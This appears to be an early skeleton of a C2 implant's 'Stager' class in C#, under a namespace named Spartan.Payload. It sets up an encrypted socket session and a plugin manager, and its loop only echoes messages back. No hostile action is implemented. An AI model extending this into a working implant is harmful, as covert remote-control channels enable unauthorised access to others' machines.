using System.Runtime.Loader;

namespace Spartan.Payload;

public class Stager
{
    private readonly SocketClient _socketClient;
    private readonly PluginManager _pluginManager;

    public Stager(BinaryReader binaryReader, BinaryWriter binaryWriter)
    {
        _socketClient = new SocketClient(binaryReader, binaryWriter);
        _pluginManager = new PluginManager();
        
        _socketClient.PerformX3dhHandshake();
        _socketClient.InitializeRatchet();
    }

    // private Dictionary<dynamic, dynamic> GetCommandDictionary()
    // {
    //     var commandDictionary = new Dictionary<dynamic, dynamic>();
    // }

    public void Run()
    {
        while (true)
        {
            var message = _socketClient.ReceiveData<string>();
            var response = $"You said {message}";
            _socketClient.SendData(response);
        }
    }
}